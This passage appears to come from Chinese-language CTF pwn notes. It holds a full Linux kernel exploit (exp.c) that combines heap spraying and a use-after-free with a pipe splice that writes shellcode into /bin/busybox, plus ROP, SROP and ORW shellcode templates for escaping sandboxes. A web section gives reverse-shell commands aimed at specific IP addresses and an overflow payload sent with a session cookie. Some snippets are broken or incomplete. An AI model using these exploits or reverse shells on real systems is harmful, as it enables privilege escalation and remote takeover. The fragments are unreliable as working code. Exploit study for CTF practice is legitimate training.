    pthread_mutex_lock(&mutex);
    poll_threads++;
    pthread_mutex_unlock(&mutex);

    debug("[Thread %d] Start polling...\n", id);
    int ret = poll(pfds, nfds, timer);
    debug("[Thread %d] Polling complete: %d!\n", id, ret);
    
    assign_thread_to_core(randint(1, 3));

    if (suspend)
    {   
        debug("[Thread %d] Suspending thread...\n", id);

        pthread_mutex_lock(&mutex);
        poll_threads--;
        pthread_mutex_unlock(&mutex);

        while (1) { };
    }
        
}


void create_poll_thread(int id, size_t size, int timer, bool suspend)
{
    struct t_args *args;

    args = calloc(1, sizeof(struct t_args));

    if (size > PAGE_SIZE)
        size = size - ((size/PAGE_SIZE) * sizeof(struct poll_list));

    args->id = id;
    args->nfds = NFDS(size);
    args->timer = timer;
    args->suspend = suspend;

    pthread_create(&poll_tid[id], 0, alloc_poll_list, (void *)args);
}


void join_poll_threads(void)
{
    for (int i = 0; i < poll_threads; i++)
    {
        pthread_join(poll_tid[i], NULL);
        // open("/proc/self/stat", O_RDONLY);
    }
        
    poll_threads = 0;
}


int alloc_key(int id, char *buff, size_t size)
{
	char desc[256] = { 0 };
    char *payload;
    int key;

    size -= sizeof(struct user_key_payload);

    sprintf(desc, "payload_%d", id);

    payload = buff ? buff : calloc(1, size);

    if (!buff)
        memset(payload, id, size);    

    key = add_key("user", desc, payload, size, KEY_SPEC_PROCESS_KEYRING);

    if (key < 0)
	{
		perror("[X] add_key()");
		return -1;
	}
    	
    return key;
}


void free_key(int i)
{
    if(!keys[i]) puts("Invalid keys[i]");
	
    if(keyctl_revoke(keys[i]) < 0 || keyctl_unlink(keys[i], KEY_SPEC_PROCESS_KEYRING) < 0){
        printf("keys[%d]\n ",i);
        perror("=> ");
        // printf("%d\n")
        return -1;
    }
	
    // n_keys--;
}
void revoke_key(int i)
{
    if(!keys[i]) puts("Invalid keys[i]");
	if(keyctl(KEYCTL_REVOKE, keys[i], 0, 0, 0) < 0){
        printf("keys[%d] ",i);
        perror("=> ");
        return -1;
    }
	// keyctl_unlink(keys[i], KEY_SPEC_PROCESS_KEYRING);
    // n_keys--;
}


void free_all_keys(bool skip_corrupted_key)
{
    for (int i = 0; i < n_keys; i++)
    {   
        if (skip_corrupted_key && i == corrupted_key)
            continue;

        free_key(i);
    }

    sleep(1); // GC keys
}


char *get_key(int i, size_t size)
{
	char *data;

	data = calloc(1, size);
	keyctl_read(keys[i], data, size);
    // printf("%s\n",data);
	return data;
}


void alloc_pipe_buff(int i)
{
    if (pipe(pipes[i]) < 0)
    {
        perror("[X] alloc_pipe_buff()");
        return;
    }

    // if (write(pipes[i][1], "XXXXX", 5) < 0)
    // {
    //     perror("[X] alloc_pipe_buff()");
    //     return;
    // }
}


void release_pipe_buff(int i)
{
    if (close(pipes[i][0]) < 0)
    {
        perror("[X] release_pipe_buff()");
        return;
    }

    if (close(pipes[i][1]) < 0)
    {
        perror("[X] release_pipe_buff()");
        return;
    }
}


void alloc_tty(int i)
{
    ptmx[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);

    if (ptmx[i] < 0)
    {
        perror("[X] alloc_tty()");
        exit(1);
    }
}


void free_tty(int i)
{
    close(ptmx[i]);
}


void alloc_seq_ops(int i)
{
    seq_ops[i] = open("/proc/self/stat", O_RDONLY);

    if (seq_ops[i] < 0)
    {
        perror("[X] spray_seq_ops()");
        exit(1);
    }
}


void free_seq_ops(int i)
{
    close(seq_ops[i]);
}


int leak_kernel_pointer(int kid)
{
    uint64_t *leak;
    char *key;

    key = get_key(kid, 0xfff0);
    leak = (uint64_t *)key;

    // if (is_kernel_pointer(*leak) && (*leak & 0xfff) == 0x520)
    // {
    //     // corrupted_key = i;
    //     // proc_single_show = *leak;
    //     // kernel_base = proc_single_show - 0xffffffff813275c0;

    //     // printf("[+] Corrupted key found: keys[%d]!\n", corrupted_key);
    //     // printf("[+] Leaked proc_single_show address: 0x%llx\n", proc_single_show);
    //     // printf("[+] Kernel base address: 0x%llx\n", kernel_base + 0xffffffff00000000);
    //     kernel_base = 
        
    //     return 0;
    // }
    for (int i = 0; i < 0xfff0/sizeof(uint64_t); i++)
    {
        // if(is_heap_pointer(leak[i])){
        //     printf("heap_%d ==> 0x%llx\n",i,leak[i]);
        // }
        if (is_kernel_pointer(leak[i]) && (leak[i] & 0xfff) == 0x520)
        {   
            // if (leak[i + 2] == leak[i + 3] && leak[i + 2] != 0)
            // {
            //     target_object = leak[i];
            //     logi("Leaked kmalloc-1024 object: 0x%llx\n", target_object);
            //     return 0;
            // }
            uint64_t kernel_base1 = leak[i] - 0x1ab2520;
            logi("get kernel_base: 0x%llx",kernel_base1);
            return kernel_base1;
        }
    }

    return -1;
}


int leak_heap_pointer(int kid)
{
    uint64_t *leak;
    char *key;

    key = get_key(kid, 0xfff0);
    // hexdump(key,0x100);
    leak = (uint64_t *)key;

    for (int i = 0; i < 0xfff0/sizeof(uint64_t); i++)
    {
        // if(is_heap_pointer(leak[i])){
        //     printf("heap_%d ==> 0x%llx\n",i,leak[i]);
        // }
        if (is_heap_pointer(leak[i]) && (leak[i] & 0xff) == 0x00)
        {   
            if (leak[i + 2] == leak[i + 3] && leak[i + 2] != 0)
            {
                target_object = leak[i];
                logi("Leaked kmalloc-1024 object: 0x%llx", target_object);
                return 0;
            }
        }
    }

    return -1;
}


bool check_root()
{
	int fd;
    
    if ((fd = open("/etc/shadow", O_RDONLY)) < 0)
        return false;
        
    close(fd);
    
    return true;
}
```





exp.c

```c
#include "banzi.h"
int add(int fd,char *buf){
    uint64_t arg[1] = {buf};
    ioctl(fd,0x20,arg);
}
int del(int fd,uint64_t idx){
    uint64_t arg[1] = {idx};
    ioctl(fd,0x30,arg);
}
int main(){
    const char attack_data[] = {106, 104, 72, 184, 47, 98, 105, 110, 47, 47, 47, 115, 80, 72, 137, 231, 104, 114, 105, 1, 1, 129, 52, 36, 1, 1, 1, 1, 49, 246, 86, 106, 8, 94, 72, 1, 230, 86, 72, 137, 230, 49, 210, 106, 59, 88, 15, 5};
    char *buf = calloc(1,0x4000);
    char data[0x1000] = { 0 };
    char key[32] = { 0 };
    uint64_t *rop;
    void *stack;
    char *buff;
    struct msghdr msgh = {0};
    struct sockaddr_in addr = {0};
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    assign_to_core(0);
    save_state();
    fd = open("/dev/kernelpwn",1);
    if(fd < 0){
        puts("Open Error");
        _exit(1);
    }
    puts("[1-1]draining kmalloc-512");
    for(int i = 0;i < 8;i++){
      memset(buf,'a',0x200);
      keys[i] = alloc_key(i,buf,0x110);
    }
    // memset(buf,'b',0x200);
    add(fd,buf);
    del(fd,0);
    puts("[1-2]spray user_key_payload(0x200) and free all keys");
    for(int i = 8;i<73;i++){
      keys[i] = alloc_key(i,buf,0x110);
    }
    for(int i = 0;i<73;i++){
      free_key(i);
    }
    puts("[1-3]spray msg_msg to cross cache attack");
    build_msg(2000);
    memset(msgbuf.mtext,'A',0x200);
    for(int i = 0;i<1000;i++){
      msgbuf.mtype = 1;
      add_msg(msgqid[i],&msgbuf,0x200-0x30);
    }
    for(int i = 0;i<1000;i++){
      msgbuf.mtype = 2;
      add_msg(msgqid[i],&msgbuf,0x400-0x30);
    }
    puts("[1-4]uaf");//此时漏洞对块和msg_msg共用一个堆块
    del(fd,0);
    //通过skb_buffer来占位msg_msg
    puts("[2-1]spray skb_buffer to change msg_msg->m_ts leak heap_addr");
    *(uint64_t*)buf = NULL;
    *(uint64_t*)(buf+8) = NULL;
    *(uint64_t*)(buf+8*2) = 1;
    *(uint64_t*)(buf+8*3) = 0x1000-0x30;
    *(uint64_t*)(buf+8*4) = NULL;
    *(uint64_t*)(buf+8*5) = NULL;
    *(uint64_t*)(buf+8*6) = 0xdeadbeaf;
    *(uint64_t*)(buf+8*7) = 0xdeadbeaf;
    int ss[1000][2];
    for(int i = 0;i < 500;i++){
      if (socketpair(AF_UNIX, SOCK_STREAM, 0, ss[i]) < 0) {
          perror("[-] socketpair");
          return -1;
      }
    }
    for(int i = 0;i<200;i++){
      *(uint64_t*)(buf+8*8) = i;
      if (write(ss[i][0], buf, 0x200-0x140) < 0) {
            perror("[-] write");
            return -1;
      }
    }
    puts("[2-2]leak msg_msg == skb_buffer");//此时msg_msg和skb_buffer会喷在一个对块里面
    int msg_key,skb_key;
    uint64_t heap_addr,heap_addr1;
    for(int i = 0;i<1000;i++){
      show_msg(msgqid[i],buf,0x1000-0x30,0);
      if(*(uint64_t*)(buf+8) == 0xdeadbeaf ){
        msg_key = i;
        skb_key = *(uint64_t*)(buf+8*3);
        printf("msg_key : %d skb_key: %d\n",msg_key,skb_key);
        break;
      }
    }
    puts("[2-3]leak heap_addr");//通过泄漏堆地址来造msg_msg上的任意msg_msg的free
    if(msg_key != 0){
      for(int i = 0;i<(0x1000-0x30)/0x8;i++ ){
        printf("%d => %llx\n",i,*(uint64_t*)(buf + i*8) );
        if(*(uint64_t*)(buf + i*8) == 1 && *(uint64_t*)(buf + (i+1)*8) == 0x1d0 ){
          heap_addr = *(uint64_t*)(buf + (i-2)*8);
          heap_addr1 = *(uint64_t*)(buf + (i-1)*8);
          printf("heap leak: 0x%llx\n",heap_addr);
          break;
        }
      }
    }
    puts("[2-4]free skb_buffer to hijack msg_msg");//造任意msg_msg free
    if (read(ss[skb_key][1], buf, 0x200-0x140) < 0) {
        perror("[-] read");
        return -1;
    }
    *(uint64_t*)buf = heap_addr;
    *(uint64_t*)(buf+8) = heap_addr1;
    *(uint64_t*)(buf+8*2) = 1;
    *(uint64_t*)(buf+8*3) = 0x200-0x30;
    *(uint64_t*)(buf+8*4) = NULL;
    *(uint64_t*)(buf+8*5) = NULL;
    *(uint64_t*)(buf+8*6) = 0xdeadbeaf;
    *(uint64_t*)(buf+8*7) = 0xdeadbeaf;
    for(int i = 200;i<300;i++){
      *(uint64_t*)(buf+8*8) = i;
      if (write(ss[i][0], buf, 0x200-0x140) < 0) {
            perror("[-] write");
            return -1;
      }
    }
    for(int i = 0;i<1000;i++){
      show_msg(msgqid[i],buf,0x200-0x30,0);
      if(*(uint64_t*)(buf+8) == 0xdeadbeaf ){
        // msg_key = i;
        skb_key = *(uint64_t*)(buf+8*3);
        printf("msg_key : %d skb_key: %d\n",msg_key,skb_key);
        break;
      }
    }
    puts("[2-5] free 0x400 msg_msg");
    free_msg(msgqid[msg_key],buf,0x400-0x30,2);
    *(uint64_t*)buf = heap_addr1;
    *(uint64_t*)(buf+8) = heap_addr1;
    *(uint64_t*)(buf+8*2) = 0x2;
    *(uint64_t*)(buf+8*3) = 0x400-0x30;
    *(uint64_t*)(buf+8*4) = NULL;
    *(uint64_t*)(buf+8*5) = NULL;
    *(uint64_t*)(buf+8*6) = 0xdeadbeaf;
    *(uint64_t*)(buf+8*7) = 0xdeadbeaf;
    for(int i = 300;i<310;i++){
      *(uint64_t*)(buf+8*8) = i;
      if (write(ss[i][0], buf, 0x400-0x140) < 0) {
          perror("[-] write");
          return -1;
      }
    }
    //show_msg是以idx为基准的
    int skb_buf1,skb_buf2;
    show_msg(msgqid[msg_key],buf,0x400-0x30,0x1);
    skb_buf1 = *(uint64_t*)(buf + 8*3);
    printf("skb_buf1 :%d\n",*(uint64_t*)(buf + 8*3));
    free_msg(msgqid[msg_key],buf,0x400-0x30,2);
    *(uint64_t*)buf = heap_addr1;
    *(uint64_t*)(buf+8) = heap_addr1;
    *(uint64_t*)(buf+8*2) = 2;
    *(uint64_t*)(buf+8*3) = 0x400-0x30;
    *(uint64_t*)(buf+8*4) = NULL;
    *(uint64_t*)(buf+8*5) = NULL;
    *(uint64_t*)(buf+8*6) = 0xdeadbeaf;
    *(uint64_t*)(buf+8*7) = 0xdeadbeaf;
    for(int i = 310;i<330;i++){
      *(uint64_t*)(buf+8*8) = i;
      if (write(ss[i][0], buf, 0x400-0x140) < 0) {
          perror("[-] write");
          return -1;
      }
    }
    show_msg(msgqid[msg_key],buf,0x400-0x30,0x1);
    skb_buf2 = *(uint64_t*)(buf + 8*3);
    printf("skb_buf2 :%d\n",*(uint64_t*)(buf + 8*3));
    if (read(ss[skb_buf1][1], buf, 0x400-0x140) < 0) {
        perror("[-] read");
        return -1;
    }
    //整理碎片
    for(int i = 330;i < 340;i++){
      // *(uint64_t*)(buf+8*8) = i;
      memset(buf,'x',0x400);
      if (write(ss[i][0], buf, 0x400-0x140) < 0) {
          perror("[-] write");
          return -1;
      }
    }
    puts("[3-1] pipe_prime");
    puts("pipe buffer");
    int pipefd[5][2];
    for(int i = 0;i<5;i++){
      if (pipe(pipefd[i]) < 0) {
          perror("[-] pipe");
          return -1;
      }
      memset(buf,"x",0x400);
      const unsigned pipe_size = fcntl(pipefd[i][1], F_GETPIPE_SZ);
      static char buffer[4096];
      for (unsigned r = pipe_size; r > 0;) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        write(pipefd[i][1], buffer, n);
        r -= n;
      }

      for (unsigned r = pipe_size; r > 0;) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        read(pipefd[i][0], buffer, n);
        r -= n;
      }
      int attack_fd = open("/bin/busybox",O_RDONLY);
      if(attack_fd < 0){
          perror("open");
          _exit(0);
      }
      loff_t offset = 0x1fdac8;
      splice(attack_fd,&offset,pipefd[i][1], NULL, 1, 0);
    }
    if (read(ss[skb_buf2][1], buf, 0x400-0x140) < 0) {
        perror("[-] read");
        return -1;
    }
    *(uint64_t*)(buf + 3*8) = 0x10;
    //整理碎片
    for(int i = 340;i < 370;i++){
      if (write(ss[i][0], buf, 0x400-0x140) < 0) {
          perror("[-] write");
          return -1;
      }
    }
    for(int i = 0 ;i< 5;i++){
      if (write(pipefd[i][1],attack_data, sizeof(attack_data)) < 0) {
          perror("[-] write");
          return -1;
      }
    }
    for(int i = 0;i<5;i++){
      close(pipefd[i][1]);
      close(pipefd[i][0]);
    }
    memset(msgbuf.mtext,'\x00',0x400);
    for(int i = 1000;i<1100;i++){
      msgbuf.mtype = 1;
      add_msg(msgqid[i],&msgbuf,0x400-0x30);//避免pipe_buffer和skb_buffer释放的时候造成double free的错误
    }
    logi("Enter exit");
    // __pause("debug");
    // system("/bin/sh");

}
```



## 非堆题目案例分析🐹

### 输入逆向
strtok 按照符号进行切割，返回切割后的第一个字符串。第一个参数为NULL时候，表示继续上次的分割结果

其原理是在遇到分隔符时将分隔符替换为 \0

```c
s1 = strtok(input, "$")
 strtok(NULL, ",")

```





### 爆破循环的写法

比如爆破某一地址低位为特殊值

```python
# 通过特殊返回值来进行if判断
def pwn():
	s = p.recvline()
	if s != b"00 \n":
        cnt += 1
        print("FAIL. Try again.",t,s.decode()[0:2])
        return 0
    
	return 1
cnt = 0
while(1):
    p = process("./chall")
    if(pwn()):
        ia()
        break
    else:
        p.close()
```


```python

def pwn():
    s = p.recvline()# 前边可能要循环获取
    if s != b"00 \n":
        print("FAIL. Try again.", s.decode()[0:2])
        raise ValueError("Failed")	

cnt = 0
for i in range(1):
        try:
            pwn()
            break
        except ValueError as e:
	        print(f"Attempt {cnt+1}: {e}")
	        p.close()
	        cnt += 1
        p.close()
```







### orw->沙箱绕过🪡

#### orw_gadget

mprotect + orw汇编

这种优先级最高，结合栈迁移到bss段上(本地打在当前目录建一个flag)

```python
shellcode = asm(
'''
    mov eax, 0x67616c66 ;// flag
    push rax

    mov rdi, rsp
    xor eax, eax
    mov esi, eax
    mov al, 2
    syscall ;// open

    push rax
    mov rsi, rsp
    xor eax, eax
    mov edx, eax
    inc eax
    mov edi, eax
    mov dl, 8
    syscall ;// write open() return value

    pop rax
    test rax, rax
    js over

    mov edi, eax
    mov rsi, rsp
    mov edx, 0x01010201
    sub edx, 0x01010101
    xor eax, eax
    syscall ;// read

    mov edx, eax
    mov rsi, rsp
    xor eax, eax
    inc eax
    mov edi, eax
    syscall ;// write

over:
    xor edi, edi
    mov eax, 0x010101e8
    sub eax, 0x01010101
    syscall ;// exit
'''
)
pay = (#cyclic(64)# + flat(
[
    #0, 
    pop_rdi, 0x601000, 
    pop_rsi, 0x2000, 
    pop_rdx, 7,
    mprotect,
    jmp_rsp
]) + shellcode).ljust(0x100, b'\0')


```



下边2种通常需要调整gadget，而且还需要找个地方写入/flag

```python
pay = p64(pop_rax)+p64(2)+p64(pop_rdi)+p64(bss)+p64(pop_rsi)+p64(0)+p64(pop_rdx)+p64(0)+p64(syscall)
pay += p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(bss+0x100)+p64(pop_rdx)+p64(0x30)+p64(Read)
pay += p64(pop_rdi)+p64(1)+p64(Write)
```


Open->openat 可能会不可用

```python
pay = p64(pop_rdi)+p64(bss)+p64(pop_rsi)+p64(0)+p64(pop_rdx)+p64(0)+p64(Open)
pay += p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(bss+0x100)+p64(pop_rdx)+p64(0x30)+p64(Read)
pay += p64(pop_rdi)+p64(1)+p64(Write)
```



orw-shellcode 汇编

```python
nop #1字节
pop rdi # 1字节
xor esi, esi #2字节
xor rsi, rsi #3字节
sub rsp, 0x30 #4字节
jmp rsp #2字节
mov rax, 0 #7字节 
mov eax, 0 #5字节
syscall #2字节
```

#### 手搓shellcode汇编

```
execve()

mov rbx, 0x0068732f6e69622f
push rbx
mov rdi,rsp
mov rsi,0
mov rdx,0
mov rax,59
syscall


    xor edi, edi
    xchg rsi, rdx
    add rsi, 0xb
    syscall



```

#### 栈迁移/orw_shellcode

```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# p = remote("","")
# p = process('./ld-2.33.so ./TinyNote'.split(),env={'LD_PRELOAD':'./libc-2.33.so'})
p = process("./heap2019")
elf = ELF("./heap2019")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
# context.terminal = ['cmd.exe', '/c', 'wt.exe', '-w', '0','--title', 'gdb', 'bash', '-c']
context.terminal = ['tmux', 'splitw', '-hp','60']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

pop_rdi = 0x0000000000401393
pop_rsi = 0x0000000000401391
ret = 0x000000000040101a

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

read = 0x4012CF
main = 0x4012C0
bss = 0x404200
#-------------------泄露libc-------------------------
# 如果一点都不够就直接栈迁移，泄露以后再继续栈迁移
ru("before you try to solve this task.")
pay = 'a'*0x100+p64(bss)+p64(read)
s(pay)
pay = 'a'*0x100+p64(bss+0x100)+p64(read)
s(pay)
pay = p64(0)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)
s(pay)

# 如果有一定空间（>=0x20）可实现栈迁移
pay = 'a'*0x20+p64(bss)+p64(pop_rdi)+p64(elf.got['puts'])+p64(elf.plt['puts'])+p64(read)
s(pay)
pay = 'a'*0x20+p64(bss+0x20)+p64(read)
s(pay)# 后续就可以orw或者mprotect改权限


# 如果仅有read函数的情况



libc_base = l64()-0x
lg('libc_base')
pop_rdx = libc_base + 0x0000000000142c92
jmp_rsp = libc_base+0x0000000000002b25
Open = libc_base+libc.sym['open']
Read = libc_base+libc.sym['read']
Write = libc_base+libc.sym['write']
# 二选一
# mprotect = libc_base + libc.sym['mprotect']
# syscall = libc_base + 0xd2625

flag = 'flag'
pay = p64(0)+p64(pop_rdi)+p64(bss-0x500)
pay += p64(pop_rsi)+p64(0x1000)
pay += p64(pop_rdx)+p64(7)
pay += p64(pop_rax)+p64(10)
pay += p64(syscall)
pay += p64(jmp_rsp)
pay += asm('''
        mov rdi, 0; mov rsi, 0x%x;mov rdx, 0x100;mov rax, 0; syscall; push rsi; ret;
        ''' % (bss+0x100))# read(0,rsi,0x100);jmp rsi
ru("let me guess\n")
s(payload)

# 可用的shellcode
# get flagname
pay = asm(shellcraft.open('./'))
pay += asm(shellcraft.getdents64(3, bss+0x300, 0x100))
pay += asm(shellcraft.write(1, bss+0x300, 0x100))
pay += asm('''
        mov rdi, 0; mov rsi, 0x%x;mov rdx, 0x100;mov rax, 0; syscall; push rsi; ret;
        ''' % (main))# 等价于call main
s(pay)
ru("flag")
flagname='flag'+p.recv(20)
print(flagname)

# cat flag 1
flag = 'flag'
pay = asm(shellcraft.cat(flag))
pay += asm('''
        mov rdi, 0; mov rsi, 0x%x;mov rdx, 0x100;mov rax, 0; syscall; push rsi; ret;
        ''' % (bss+0x100))# read(0,rsi,0x100);jmp rsi
s(pay)
# cat flag 2
pay += asm(shellcraft.open((flagname)))
pay += asm(shellcraft.read(3, bss+0x700, 0x400)) # pay += shellcraft.read(3,'rsp',0x100)
pay += asm(shellcraft.write(1,bss+0x700, 0x400)) # pay += shellcraft.write(1,'rsp',0x100)
pay += asm('''
        mov rdi, 0; mov rsi, 0x%x;mov rdx, 0x100;mov rax, 0; syscall; push rsi; ret;
        ''' % (main))
s(pay)

#--------------------直接orw----------------------
flag = 0x404200
pay = 'flag'.ljust(8,'\x00')+p64(pop_rdi)+p64(flag)+p64(pop_rsi)+p64(0)*2+p64(pop_rdx)+p64(0)+p64(Open)
pay += p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(0x404200)+p64(0)+p64(pop_rdx)+p64(0x30)+p64(Read)
pay += p64(pop_rdi)+p64(1)+p64(Write)
sl(pay)

ia()
```

#### orw涉及到堆，就需要srop来free_hook段改权限实现orw

```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# p = remote("","")
# p = process('./ld-2.33.so ./TinyNote'.split(),env={'LD_PRELOAD':'./libc-2.33.so'})
p = process("./heap2019")
elf = ELF("./heap2019")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
# context.terminal = ['cmd.exe', '/c', 'wt.exe', '-w', '0','--title', 'gdb', 'bash', '-c']
context.terminal = ['tmux', 'splitw', '-hp','60']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

def add(size):
    sla("4.show\n",'1')
    sla("Size of Heap : \n",size)

def dele(idx):
    sla("4.show\n",'2')
    sla("Index :\n",idx)

def edit(idx,size,con):
    sla("4.show\n",'3')
    sla("Index :\n",idx)
    sla("Size of Heap : \n",size)
    sa("Content of heap : \n",con)
def show(idx):
    sla("4.show\n",'4')
    sla("Index :\n",idx)

#------------------------泄露libc------------------------------
# 堆的思路比较复杂,首先利用漏洞点泄露libc
pop_rdi = libc_base+libc.search(asm("pop rdi\nret")).next()
pop_rsi = libc_base+libc.search(asm("pop rsi\nret")).next()
pop_rdx = libc_base+libc.search(asm("pop rdx\nret")).next()
pop_rax = libc_base+libc.search(asm("pop rax\nret")).next()
jmp_rsp = libc_base+libc.search(asm("jmp rsp")).next()
syscall = libc_base+libc.search(asm("syscall\nret")).next()
mprotect = libc_base + libc.sym['mprotect']

# mov rax, dword ptr [rdi + 0x20]; mov rbp, rdi;test rax, rax; je 0x34fe3; call rax;跳转至rdi+0x20
gadget = libc_base+0x0000000000034fd5
free_hook_base = (libc_base+libc.sym["__free_hook"]) & 0xfffffffffffff000
pop3_ret = libc_base+0x00000000000e6ce5
leave_ret = libc_base+0x000000000005a9a8
pop_rsp = libc_base+0x000000000002709c
# 劫持free_hook-0xa0,写入
pay  = p64(0)+p64(pop3_ret)+p64(0)*2+p64(leave_ret)#<-开始执行
pay += p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(free_hook_base)
pay += p64(pop_rdx_r12)+p64(0x1000)*2+p64(pop_rax)+p64(0)
pay += p64(syscall)# read
pay += p64(pop_rsp)+p64(free_hook_base)# jmp rsp
pay  = payload.ljust(0xa0,"\x00")
# print len(pay)
pay += p64(gadget)
sla(">>",pay)

pay = p64(pop_rdi)+p64(free_hook_base)+p64(pop_rsi)+p64(0x2000)# mprotect改free_hook段的权限执行shellcode
pay += p64(pop_rdx_r12)+p64(7)+p64(7)+p64(pop_rax)+p64(10)+p64(syscall)+p64(free_hook_base+0x70)
sc  = shellcraft.open("flag");
sc += shellcraft.read(3,free_hook_base+0x300,0x100)
sc += shellcraft.write(1,free_hook_base+0x300,0x100)

sl(pay.ljust(0x70,"\x00")+asm(sc))
#--------------------------------------------------------------
# mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]; SROP+setcontext
gadget = libc_base+0x0000000000034fd5
free_hook_base = (libc_base+libc.sym["__free_hook"]) & 0xfffffffffffff000
setcontext = libc_base+libc.sym['setcontext']+61
frame = SigreturnFrame()# 这个框架的地址要赋给rdx
frame.rsp = libc_base + libc.sym['__free_hook']+0x10# 2
frame.rdi = free_hook_base
frame.rsi = 0x1000
frame.rdx = 7
frame.rip = libc_base + libc.sym['mprotect']# 1

# 劫持到free_hook-0x150,写入
frame_addr = libc_base+libc.sym["__free_hook"]-0x150+0x10
pay = p64(0)+p64(frame_addr)+p64(0)*4+p64(setcontext)+str(frame)[0x28:]# 0x28正好补齐即从+0x10开始
pay = payload.ljust(0x150,'\x00')
pay += p64(gadget)
pay += p64(0)+p64(libc_base+libc.sym["__free_hook"]+0x18)#2
pay += asm('''
        mov rdi, 0; mov rsi, 0x%x;mov rdx, 0x100;mov rax, 0; syscall; push rsi; ret;
        ''' % (free_hook_base))
sla(">>",pay)

dele(free_hook-0x150)# *
# orw
sc = asm(shellcraft.cat('flag'))
sc += asm('''
        mov rdi, 0; mov rsi, 0x%x;mov rdx, 0x100;mov rax, 0; syscall; push rsi; ret;
        ''' % (free_hook_base+0x100))
s(sc)
ia()
```



### Pwn with Web 💻




![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20240123211043.png)



```python
# 创建反向 shell ，并将其输入和输出都重定向到一个远程服务器
cmd = 'bash -c "bash -i >& /dev/tcp/39.102.55.191/9999 0>&1"\x00'
sh -c "sh -i >& /dev/tcp/150.158.144.112/1234 0>&1"\x00
# nc -lvvp 1234
```

发包

```python
from pwn import *
import requests

cookies = {
    'session': 'eyJ1c2VybmFtZSI6Ims0bjk2NiJ9.ZI_LbQ.56KQg3j3spZksRCrTnhkoOu3238',
}

headers = {
    'Accept': '*/*',
    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
    'Cache-Control': 'max-age=0',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://94.74.101.210:50644',
    'Proxy-Connection': 'keep-alive',
    'Referer': 'http://94.74.101.210:50644/',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
}


vip = 0x401129
main = 0x400FF9
payload = b'a'.ljust(0xe8,b'a') + p64(vip) + p64(main)

response = requests.post('http://94.74.101.210:50644/vip.cgi', headers=headers, cookies=cookies, data=payload, verify=False)


print(response.text)
```

增加本地访问

```http
Client-Ip: 127.0.0.1
X-Forwarded-For: 127.0.0.1
```


#### gRPC(远程过程调用)

https://grpc.io/docs/languages/go/quickstart/

基于 ProtoBuf(Protocol Buffers) 序列化协议开发，且支持众多开发语言

gprc的使用流程一般是这样的：

1. 定义标准的proto文件(后面部分会详细讲解protobuf的使用)
2. 生成标准代码
3. 服务端使用生成的代码提供服务(参考各个语言的使用)
4. 客户端使用生成的代码调用服务(参考各个语言的使用)










#### Protobuf
```shell
# 安装 Go 的协议编译器插件
go install google.golang.org/protobuf/cmd/protoc-gen-go@v1.28
go install google.golang.org/grpc/cmd/protoc-gen-go-grpc@v1.2
```

proto

```json
// Copyright 2015 gRPC authors.
//
